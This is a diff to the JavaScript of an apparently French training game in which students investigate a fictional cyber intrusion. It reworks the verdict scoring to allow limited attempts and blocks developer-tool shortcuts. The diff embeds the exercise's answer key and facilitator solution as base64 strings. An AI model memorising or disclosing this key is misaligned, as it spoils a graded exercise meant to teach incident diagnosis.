+const VERDICT_KEY_B64='eyJhbnN3ZXJzIjp7InYxIjoiSnVsaWVuIE1PUkVBVSIsInYyIjoiYSIsInYzIjoiMTg1LjIyMC4xMDEuNDciLCJ2NCI6ImMiLCJ2NSI6WyJWYW5pdMOpIiwiRXNww6hjZXMiXX0sImV4cGxhaW4iOnsidjEiOiJKdWxpZW4gTU9SRUFVIChEU0kpIGVzdCBsZSBjb21wdGUgY29tcHJvbWlzIDogYWNjw6hzIGFkbWluLCBwb3N0ZSBhdSBjZW50cmUgZGVzIGFsZXJ0ZXMgRFNJLCBtZXNzYWdlcmllIGludGVybmUgYW1iaWd1w6ssIGF1Y3VuIGF1dHJlIHN1c3BlY3QgbidhIMOgIGxhIGZvaXMgbGUgbW90aWYgZXQgbCdhY2PDqHMgdGVjaG5pcXVlLiIsInYyIjoiTGUgbWFpbCBkdSBmYXV4IHJlY3J1dGV1ciBUaGFsZXMgKHNwZWFycGhpc2hpbmcpIGF2ZWMgcGnDqGNlIGpvaW50ZSAuZG9jbSBlc3QgbGUgdmVjdGV1ciBpbml0aWFsIGNvbmZpcm3DqSBwYXIgbGVzIGxvZ3MgKDAyLzA1LCBwaGFzZSAyKS4iLCJ2MyI6IjE4NS4yMjAuMTAxLjQ3IGVzdCBsJ0lQIHNhbnMgcHJvcHJpw6l0YWlyZSBjb25udSBldCBhdSB2b2x1bWUgaW5jb21wYXRpYmxlIGF2ZWMgZGUgbGEgdMOpbMOpbcOpdHJpZS4gMTAuNDIuNi4xMSBlc3QgbGUgc2VydmV1ciBpbnRlcm5lIGzDqWdpdGltZSwgMjAuNDIuNzMuMTggdW4gc2VydmljZSBBenVyZSBOVFAgbMOpZ2l0aW1lLiIsInY0IjoiTCdhYnNlbmNlIGRlIHJldnVlIGRlIGNvZGUgZXQgZGUgY29udHLDtGxlIGRlcyBjaGFuZ2VtZW50cyBzdXIgbGUgcHJvZ3JhbW1lIGRlIHN1cGVydmlzaW9uIGTDqXBsb3nDqSBzdXIgbGEgcGFzc2VyZWxsZSBhIHBlcm1pcyBsJ2ludHJvZHVjdGlvbiBkJ3VuZSBwb3J0ZSBkw6lyb2LDqWUgcGFyIHVuZSBzaW1wbGUgbW9kaWZpY2F0aW9uIGRlIGNvZGUsIHBvdXNzw6llIHNhbnMgdGlja2V0IGxlIDkgbWFpICh2b2lyIG9uZ2xldCBQcm9ncmFtbWF0aW9uKSBldCBkw6l0ZWN0w6llIHBhciBsZSBjb250csO0bGUgZCdpbnTDqWdyaXTDqSBXYXp1aCBGSU0gLSBjJ2VzdCBsZSBjxZN1ciBkdSBkaWFnbm9zdGljIGF0dGVuZHUgZGFucyB2b3RyZSByYXBwb3J0LiIsInY1IjoiVmFuaXTDqSAobWlzc2lvbiBmbGF0dGV1c2UsIGV4Y2x1c2l2ZSkgZXQgRXNww6hjZXMgKHLDqW11bsOpcmF0aW9uIGF0dHJhY3RpdmUgZmFjZSDDoCBkZXMgZGlmZmljdWx0w6lzIGZpbmFuY2nDqHJlcyByw6llbGxlcykgc29udCBsZXMgZGV1eCBsZXZpZXJzIGRvY3VtZW50w6lzLiBBdWN1bmUgdHJhY2UgZCdpZMOpb2xvZ2llIG91IGRlIGNvbnRyYWludGUvY2hhbnRhZ2UgZGFucyBsZSBkb3NzaWVyLiJ9fQ==';
 function getVerdictKey(){
   return JSON.parse(decodeURIComponent(escape(atob(VERDICT_KEY_B64))));
 }
 
-const ANIM_SOLUTION_B64='PHN0cm9uZz5Db3VwYWJsZSA6PC9zdHJvbmc+IEp1bGllbiBNT1JFQVUgKERTSSksIHJlY3J1dMOpIHBhciBpbmfDqW5pZXJpZSBzb2NpYWxlIChwcmVzc2lvbiBmaW5hbmNpw6hyZSArIGZsYXR0ZXJpZSAtIGxldmllcnMgRXNww6hjZXMgZXQgVmFuaXTDqSkuPGJyPgogICAgPHN0cm9uZz5WZWN0ZXVyIGluaXRpYWwgOjwvc3Ryb25nPiBtYWlsIHNwZWFycGhpc2hpbmcgKGZhdXggcmVjcnV0ZXVyIFRoYWxlcyksIHBpw6hjZSBqb2ludGUgLmRvY20gcGnDqWfDqWUuPGJyPgogICAgPHN0cm9uZz5DYW5hbCBkZSBzb3J0aWUgOjwvc3Ryb25nPiBwYXNzZXJlbGxlIEJYLUdBVEVXQVktMDcgdmVycyBsJ0lQIDE4NS4yMjAuMTAxLjQ3ICjDoCBkaXN0aW5ndWVyIGRlIDEwLjQyLjYuMTEgPSBpbnRlcm5lIGzDqWdpdGltZSBldCAyMC40Mi43My4xOCA9IEF6dXJlIE5UUCBsw6lnaXRpbWUpLjxicj4KICAgIDxzdHJvbmc+Q2F1c2UgcmFjaW5lIG9yZ2FuaXNhdGlvbm5lbGxlIDo8L3N0cm9uZz4gY2hhbmdlbWVudCBkZSBmb3Vybmlzc2V1ciBkZXMgY2FydGVzIFJhc3BiZXJyeSBQaSAoU2lub0JvYXJkKSBzYW5zIHZhbGlkYXRpb24gc8OpY3VyaXTDqSBEU0kuPGJyPgogICAgPHN0cm9uZz5GYXVzc2VzIHBpc3RlcyDDoCDDqWNhcnRlciA6PC9zdHJvbmc+IEthcmltIEJFTllPVUNFRiAobW90aWYgZmluYW5jaWVyIG1haXMgYXVjdW4gYWNjw6hzKSwgQ2FtaWxsZSBST1VTU0VBVSAoaWTDqW9sb2dpZSBtYWlzIGF1Y3VuIGFjY8OocywgYWxpYmkpLCBUaG9tYXMgVkFTU0VVUiAodHJvdSBkZSBDViBtYWlzIGF1Y3VuZSBwcmV1dmUpLCBGYXJpZCBIQUREQUQgKHZveWFnZXMgbWFpcyBhdWN1biBsaWVuKSwgYW5vbWFsaWUgcXVhbGl0w6kgQlgtNDIxNiAocHJvYmzDqG1lIGluZMOpcGVuZGFudCksIEFudG9pbmUgUk9CRVJUIChhY2PDqHMgcsOpdm9xdcOpcyDDoCBzb24gZMOpcGFydCksIFRlY2hJbmR1cyBTb2x1dGlvbnMgKGF1Y3VuZSBwcmV1dmUgdGVjaG5pcXVlKS4=';
+const ANIM_SOLUTION_B64='PHN0cm9uZz5Db3VwYWJsZSA6PC9zdHJvbmc+IEp1bGllbiBNT1JFQVUgKERTSSksIHJlY3J1dMOpIHBhciBpbmfDqW5pZXJpZSBzb2NpYWxlIChwcmVzc2lvbiBmaW5hbmNpw6hyZSArIGZsYXR0ZXJpZSAtIGxldmllcnMgRXNww6hjZXMgZXQgVmFuaXTDqSkuPGJyPgogICAgPHN0cm9uZz5WZWN0ZXVyIGluaXRpYWwgOjwvc3Ryb25nPiBtYWlsIHNwZWFycGhpc2hpbmcgKGZhdXggcmVjcnV0ZXVyIFRoYWxlcyksIHBpw6hjZSBqb2ludGUgLmRvY20gcGnDqWfDqWUuPGJyPgogICAgPHN0cm9uZz5DYW5hbCBkZSBzb3J0aWUgOjwvc3Ryb25nPiBwYXNzZXJlbGxlIEJYLUdBVEVXQVktMDcgdmVycyBsJ0lQIDE4NS4yMjAuMTAxLjQ3ICjDoCBkaXN0aW5ndWVyIGRlIDEwLjQyLjYuMTEgPSBpbnRlcm5lIGzDqWdpdGltZSBldCAyMC40Mi43My4xOCA9IEF6dXJlIE5UUCBsw6lnaXRpbWUpLjxicj4KICAgIDxzdHJvbmc+Q2F1c2UgcmFjaW5lIG9yZ2FuaXNhdGlvbm5lbGxlIDo8L3N0cm9uZz4gYWJzZW5jZSBkZSByZXZ1ZSBkZSBjb2RlIGV0IGRlIGNvbnRyw7RsZSBkZXMgY2hhbmdlbWVudHMgc3VyIGxlIHByb2dyYW1tZSBkZSBzdXBlcnZpc2lvbiBkZSBsYSBwYXNzZXJlbGxlIEJYLUdBVEVXQVktMDcsIGF5YW50IHBlcm1pcyBsJ2ludHJvZHVjdGlvbiBkJ3VuZSBwb3J0ZSBkw6lyb2LDqWUgcGFyIG1vZGlmaWNhdGlvbiBkJ3VuZSBsaWduZSBkZSBjb2RlIGxlIDkgbWFpICh2b2lyIG9uZ2xldCBQcm9ncmFtbWF0aW9uKSwgZMOpdGVjdMOpZSBwYXIgbGUgY29udHLDtGxlIGQnaW50w6lncml0w6kgV2F6dWggRklNLjxicj4KICAgIDxzdHJvbmc+RmF1c3NlcyBwaXN0ZXMgw6Agw6ljYXJ0ZXIgOjwvc3Ryb25nPiBLYXJpbSBCRU5ZT1VDRUYgKG1vdGlmIGZpbmFuY2llciBtYWlzIGF1Y3VuIGFjY8OocyksIENhbWlsbGUgUk9VU1NFQVUgKGlkw6lvbG9naWUgbWFpcyBhdWN1biBhY2PDqHMsIGFsaWJpKSwgVGhvbWFzIFZBU1NFVVIgKHRyb3UgZGUgQ1YgbWFpcyBhdWN1bmUgcHJldXZlKSwgRmFyaWQgSEFEREFEICh2b3lhZ2VzIG1haXMgYXVjdW4gbGllbiwgZG9zc2llciBmb3Vybmlzc2V1ciBqYW1haXMgdmFsaWTDqSBuaSBkw6lwbG95w6kpLCBhbm9tYWxpZSBxdWFsaXTDqSBCWC00MjE2IChwcm9ibMOobWUgaW5kw6lwZW5kYW50LCBjb25maXJtw6kgY29uZm9ybWUpLCBBbnRvaW5lIFJPQkVSVCAoYWNjw6hzIHLDqXZvcXXDqXMgw6Agc29uIGTDqXBhcnQpLCBUZWNoSW5kdXMgU29sdXRpb25zIChhdWN1bmUgcHJldXZlIHRlY2huaXF1ZSku';
 function toggleAnimSolution(){
   const el=document.getElementById('anim-solution');
   if(!el.innerHTML.trim()){
@@ -2495,48 +2559,64 @@ function toggleAnimSolution(){
   el.classList.toggle('show');
 }
 
-function submitVerdict(){
+function computeVerdictScore(){
   const v1=document.querySelector('input[name="v1"]:checked');
   const v2=document.querySelector('input[name="v2"]:checked');
   const v3=document.querySelector('input[name="v3"]:checked');
   const v4=document.querySelector('input[name="v4"]:checked');
   const v5=[...document.querySelectorAll('input[name="v5"]:checked')].map(i=>i.value);
+  if(!v1||!v2||!v3||!v4||v5.length===0) return null;
+  const key=getVerdictKey();
+  let score=0;
+  if(v1.value===key.answers.v1)score++;
+  if(v2.value===key.answers.v2)score++;
+  if(v3.value===key.answers.v3)score++;
+  if(v4.value===key.answers.v4)score++;
+  if(v5.length===key.answers.v5.length&&v5.every(x=>key.answers.v5.includes(x)))score++;
+  return score;
+}
 
-  if(!v1||!v2||!v3||!v4||v5.length===0){
+function renderVerdictOutcome(score){
+  updateVerdictAttemptsLabel();
+  if(verdictLocked){
+    document.querySelectorAll('#panel-verdict input').forEach(i=>i.disabled=true);
+    const btn=document.querySelector('#panel-verdict button[onclick="submitVerdict()"]');
+    if(btn){btn.disabled=true;btn.style.opacity='.5';btn.style.cursor='not-allowed';}
+    const tier = verdictSuccess
+      ? 'Vous êtes dans la bonne voie.'
+      : 'Tentatives épuisées. Voyez ça avec votre enseignant avant la séance 3.';
+    document.getElementById('verdict-result').innerHTML=`
+      <div class="verdict-result">
+        <div class="verdict-score-label">${tier}</div>
+        <div class="verdict-recap">
+          Pour le rapport de la séance 3, structurez-vous autour des 3 éléments demandés par la directive ministérielle (onglet Documents) : diagnostic des vulnérabilités, plan de préconisations priorisées, rappel de sensibilisation VICE.
+        </div>
+      </div>`;
+  } else {
+    let tier;
+    if(score===4)tier='Vous y êtes presque.';
+    else if(score>=2)tier='Vous vous rapprochez, mais il reste des zones d\'ombre.';
+    else tier='Vous êtes encore loin du compte, retournez enquêter.';
+    const remaining=5-verdictAttempts;
+    document.getElementById('verdict-result').innerHTML=`
+      <div class="verdict-result">
+        <div class="verdict-score-label">${tier}</div>
+        <div class="verdict-recap">Il vous reste ${remaining} tentative${remaining>1?'s':''}. Revoyez vos sources (Mails, Enquête, Journaux/Logs, Programmation, Documents, OSINT) avant de revalider.</div>
+      </div>`;
+  }
+}
+
+function submitVerdict(){
+  if(verdictLocked) return;
+  const score=computeVerdictScore();
+  if(score===null){
     toast('!','Reponses incompletes','Repondez a toutes les questions avant de valider.');
     return;
   }
-
-  const key=getVerdictKey();
-  const checks=[
-    {q:'v1',ok:v1.value===key.answers.v1,label:'Question 1 - Employé compromis'},
-    {q:'v2',ok:v2.value===key.answers.v2,label:'Question 2 - Vecteur d\'entrée'},
-    {q:'v3',ok:v3.value===key.answers.v3,label:'Question 3 - IP malveillante'},
-    {q:'v4',ok:v4.value===key.answers.v4,label:'Question 4 - Cause organisationnelle'},
-    {q:'v5',ok:v5.length===key.answers.v5.length&&v5.every(x=>key.answers.v5.includes(x)),label:'Question 5 - Leviers VICE'},
-  ];
-  const score=checks.filter(c=>c.ok).length;
-
-  let tier;
-  if(score===5)tier='Excellent travail - diagnostic complet et exact.';
-  else if(score>=3)tier='Bon travail - l\'essentiel est là, quelques points à affiner.';
-  else tier='Des éléments clés manquent encore - reprenez les onglets Mails, DSI/Logs et Documents.';
-
-  const linesHtml=checks.map(c=>`
-    <div class="verdict-line">
-      <div class="verdict-icon ${c.ok?'ok':'ko'}">${c.ok?'OK':'X'}</div>
-      <div class="verdict-line-text"><strong>${c.label}</strong><br>${key.explain[c.q]}</div>
-    </div>`).join('');
-
-  document.getElementById('verdict-result').innerHTML=`
-    <div class="verdict-result">
-      <div class="verdict-score">${score} / 5</div>
-      <div class="verdict-score-label">${tier}</div>
-      ${linesHtml}
-      <div class="verdict-recap">
-        Pour le rapport de la séance 3, structurez-vous autour des 3 éléments demandés par la directive ministérielle (onglet Documents) : diagnostic des vulnérabilités, plan de préconisations priorisées, rappel de sensibilisation VICE. Le vrai sujet du diagnostic n'est pas seulement "qui" mais surtout "comment l'organisation a laissé la faille s'installer" - achats, validation sécurité, sensibilisation du personnel.
-      </div>
-    </div>`;
+  verdictAttempts++;
+  verdictSuccess = score===5;
+  verdictLocked = verdictSuccess || verdictAttempts>=5;
+  renderVerdictOutcome(score);
   saveState();
 }
 
@@ -2560,7 +2640,9 @@ function saveState(){
       situationNotes:(document.getElementById('situation-notes')||{}).value||'',
       enigNotes:(document.getElementById('enig-textarea')||{}).value||'',
       verdictPicks:{v1:v1?v1.value:null,v2:v2?v2.value:null,v3:v3?v3.value:null,v4:v4?v4.value:null,v5:v5},
-      verdictSubmitted: !!document.querySelector('#verdict-result .verdict-score'),
+      verdictAttempts: verdictAttempts,
+      verdictLocked: verdictLocked,
+      verdictSuccess: verdictSuccess,
       sessionSecondsLeft: sessionSecondsLeft,
     };
     localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
@@ -2592,13 +2674,33 @@ function restoreState(st){
     ['v2','v3','v4'].forEach(k=>{ if(p[k]){ const el=document.querySelector('input[name="'+k+'"][value="'+CSS.escape(p[k])+'"]'); if(el)el.checked=true; } });
     if(Array.isArray(p.v5)) p.v5.forEach(v=>{ const el=document.querySelector('input[name="v5"][value="'+CSS.escape(v)+'"]'); if(el)el.checked=true; });
   }
-  if(st.verdictSubmitted) submitVerdict();
+  if(typeof st.verdictAttempts==='number') verdictAttempts=st.verdictAttempts;
+  if(st.verdictLocked) verdictLocked=true;
+  if(st.verdictSuccess) verdictSuccess=true;
+  if(verdictAttempts>0){
+    const score=computeVerdictScore();
+    if(score!==null) renderVerdictOutcome(score);
+  } else {
+    updateVerdictAttemptsLabel();
+  }
 }
 
 (function(){
   const vp=document.getElementById('panel-verdict');
   if(vp) vp.addEventListener('change', saveState);
 })();
+
+// ══════════════════════════════════════════
+// DISSUASION CONSULTATION CODE SOURCE
+// (frein basique, pas une vraie protection : le code reste lisible
+// via les outils developpeur pour qui sait les ouvrir autrement)
+// ══════════════════════════════════════════
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+  const k = e.key ? e.key.toLowerCase() : '';
+  const blocked = (e.ctrlKey || e.metaKey) && (k === 'u' || (e.shiftKey && (k === 'i' || k === 'j' || k === 'c')));
+  if (blocked || e.key === 'F12') e.preventDefault();
+});
 
 </script>
 </body>
